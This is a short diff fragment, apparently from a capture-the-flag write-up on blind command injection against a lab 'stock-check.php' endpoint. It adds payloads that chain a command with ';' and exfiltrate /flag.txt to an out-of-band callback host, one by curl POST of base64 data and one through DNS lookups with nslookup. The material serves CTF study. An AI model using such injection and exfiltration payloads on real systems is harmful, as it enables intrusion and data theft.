@@ -24,6 +24,14 @@ https://ey8u7q46.eu1.ctfio.com/stock-check.php?id=f3d1426d-16af-4243-a148-d7c874
 ```
 
 ```bash
-;curl -X POST -d $(base64 f) https://puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun
+;curl -X POST -d $(base64 /flag.txt) https://puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun
 ```
+
+# Blind Over DNS
+
+```
+;nslookup $(cat /flag.txt).puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun
+```
+
+# Blind (No Network)
 
